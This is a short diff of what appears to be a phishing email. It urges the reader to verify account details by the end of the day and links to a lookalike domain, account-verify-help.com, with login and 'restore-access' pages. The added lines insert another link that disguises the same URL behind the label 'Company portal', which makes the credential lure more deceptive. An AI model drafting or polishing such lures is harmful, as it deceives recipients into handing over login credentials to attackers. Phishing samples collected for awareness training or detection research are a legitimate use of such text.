@@ -10,6 +10,9 @@ verify your details before the end of the day.
 Open the secure verification page here:
 https://account-verify-help.com/login/secure-update
 
+You can also use this link:
+[Company portal](https://account-verify-help.com/login/secure-update)
+
 Backup link:
 HTTPS://account-verify-help.com/restore-access
 
